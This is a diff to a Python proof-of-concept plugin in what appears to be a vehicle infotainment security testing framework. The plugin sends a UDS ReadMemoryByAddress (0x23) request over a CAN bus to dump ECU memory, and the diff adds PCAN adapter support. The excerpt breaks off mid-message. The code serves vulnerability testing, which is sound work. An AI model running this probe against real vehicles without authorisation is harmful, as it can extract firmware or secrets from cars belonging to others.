@@ -1,24 +1,27 @@
 """
 PoC Name: UDS ReadMemoryByAddress
 CVE: N/A
-Component: Canbus Stack
-Category: Canbus
+Component: UDS Protocol (ISO 14229)
+Category: Protocol
 Severity: Critical
 CVSS: 8.5
-Description: UDS 0x23服务未授权读取ECU内存
-Prerequisites: SocketCAN接口, python-can库。
-Usage: python3 28_UDS_ReadMemory.py <can_interface>
+Description: 尝试UDS 0x23服务读取ECU内存,检测是否存在未授权内存读取。
+Prerequisites: PCAN接口, python-can库, PCAN驱动。
+Usage: python3 28_UDS_ReadMemory.py PCAN_USBBUS1
 """
 import sys
 from iv_plugin_base import IVIVulnerabilityPlugin
 class UDSReadMemoryPlugin(IVIVulnerabilityPlugin):
     def check_prerequisites(self): return True
     def exploit(self):
-        iface = self.params.get("can_interface", "can0")
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
         self.logger.info(f"UDS ReadMemoryByAddress测试 ({iface})...")
         try:
             import can
-            bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            if "PCAN" in iface:
+                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=iface, bustype="socketcan")
             # ReadMemoryByAddress: SID=0x23, addressAndLengthFormat=0x14
             # addr=0x00000000, size=0x0040
             msg = can.Message(arbitration_id=0x7E0,
